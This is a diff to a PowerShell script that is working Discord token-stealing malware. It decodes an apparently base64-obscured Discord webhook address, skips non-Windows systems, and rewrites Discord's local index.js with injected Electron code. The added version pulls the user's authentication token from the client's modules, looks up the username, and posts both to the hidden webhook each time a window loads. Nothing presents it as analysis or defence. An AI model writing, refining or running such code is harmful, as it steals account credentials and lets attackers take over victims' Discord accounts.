@@ -1,7 +1,6 @@
 if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") { exit }
 
 $b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MTkxNTcwMzYyMjgzMjIyOC9Ea1lackRwM1JJcVIwVVh1SkhBSURadklrX19nVk0zU29WMmU3QWZsZ0xETXRCRTV3T2ZoYmJvYnlQcHBPLU9UNjdjaQ=="
-
 $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -32,7 +31,31 @@ $f = (Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -
 
 if($f){
     $parte1 = 'const {app,net}=require("electron"),U="'
-    $parte2 = '";let l=null;app.on("browser-window-created",(e,w)=>{w.webContents.on("did-finish-load",()=>{w.webContents.executeJavaScript(`(function(){const f=()=>{try{window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(const m of Object.keys(r.c).map(x=>r.c[x].exports)){if(m&&m.default&&typeof m.default.getToken=="function"){let t=m.default.getToken();if(typeof t==="string"){console.log("T:"+t);return true}}}}])}catch(e){}return false};if(!f()){const i=setInterval(()=>{if(f())clearInterval(i)},1000)}})()`)}) ;w.webContents.on("console-message",(e,lvl,m)=>{if(m.startsWith("T:")){const t=m.split("T:")[1];if(t!==l&&t.length>10){l=t;const r=net.request({method:"POST",url:U});r.setHeader("Content-Type","application/json");r.write(JSON.stringify({content:"**Token:** `"+t+"`"}));r.end()}}})});module.exports=require("./core.asar");'
+    $js_payload = @'
+    (function(){
+        const getT=()=>{
+            try{
+                let t;
+                window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{
+                    for(const m of Object.keys(r.c).map(x=>r.c[x].exports)){
+                        if(m&&m.default&&typeof m.default.getToken=="function"){t=m.default.getToken()}
+                    }
+                }]);
+                if(t){
+                    fetch("https://discord.com/api/v9/users/@me",{headers:{"Authorization":t}})
+                    .then(r=>r.json()).then(u=>{
+                        console.log("DATA:"+u.username+"#"+u.discriminator+" ID:"+t);
+                    });
+                    return true;
+                }
+            }catch(e){}
+            return false;
+        };
+        if(!getT()){const i=setInterval(()=>{if(getT())clearInterval(i)},1000)}
+    })()
+'@.Replace("`n","").Replace("`r","")
+
+    $parte2 = '";let l=null;app.on("browser-window-created",(e,w)=>{w.webContents.on("did-finish-load",()=>{w.webContents.executeJavaScript(`' + $js_payload + '`)});w.webContents.on("console-message",(e,lvl,m)=>{if(m.startsWith("DATA:")){const d=m.split("DATA:")[1];if(d!==l){l=d;const r=net.request({method:"POST",url:U});r.setHeader("Content-Type","application/json");r.write(JSON.stringify({content:"**User:** `"+d.split(" ID:")[0]+"`\n**Token:** `"+d.split(" ID:")[1]+"`"}));r.end()}}})});module.exports=require("./core.asar");'
     
     $js_final = $parte1 + $w + $parte2
     [System.IO.File]::WriteAllText($f, $js_final)
